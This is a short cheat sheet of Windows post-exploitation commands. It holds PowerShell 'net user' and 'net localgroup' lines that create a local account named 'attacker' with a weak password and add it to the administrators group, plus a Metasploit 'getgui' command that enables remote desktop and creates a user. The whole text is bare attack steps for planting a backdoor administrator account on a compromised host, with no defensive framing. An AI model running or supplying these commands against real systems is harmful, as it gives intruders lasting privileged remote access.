# Adding Admin user + adding to RDP
```powershell
net user /add attacker password123
net localgroup administrators attacker
```



# getgui (Metasploit)
```
run getgui -e -u atk -p atk
```